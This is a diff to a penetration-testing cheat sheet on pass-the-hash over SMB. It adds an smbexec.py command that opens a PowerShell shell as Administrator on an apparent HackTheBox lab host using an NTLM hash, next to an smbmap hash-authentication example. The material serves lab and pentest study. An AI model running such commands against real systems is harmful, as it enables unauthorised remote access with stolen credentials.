@@ -28,7 +28,11 @@ _Note: If you just have the NT hash, then you can just input the NT hash twice. 
 smbmap -u USERNAME -p 0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B -H HOST
 ```
 
+Execute commands over SMB (requires write permissions):
 
+```
+smbexec.py jeeves/Administrator@jeeves.htb -hashes "aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00" -shell-type "powershell"
+```
 
 ## NTLM Hash Theft
 
